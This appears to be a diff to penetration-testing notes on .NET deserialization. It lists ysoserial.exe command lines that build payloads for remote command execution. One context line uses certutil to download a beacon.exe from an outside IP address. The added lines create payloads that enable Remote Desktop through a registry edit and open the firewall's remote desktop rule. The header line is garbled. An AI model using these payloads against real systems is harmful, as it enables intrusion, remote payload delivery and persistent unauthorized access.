@@ -8,6 +8,10 @@ arbitrary command and gaining u access to nauthorized access to  in the context 
 ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ipconfig" -o raw
 ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c hostname" -o raw
 ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c certutil.exe -urlcache -split -f  http://192.168.100.199\beacon.exe C:\\Users\\Public\\beacon.txe" -o raw
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+"
 ```
 # Deserialization 
 ```
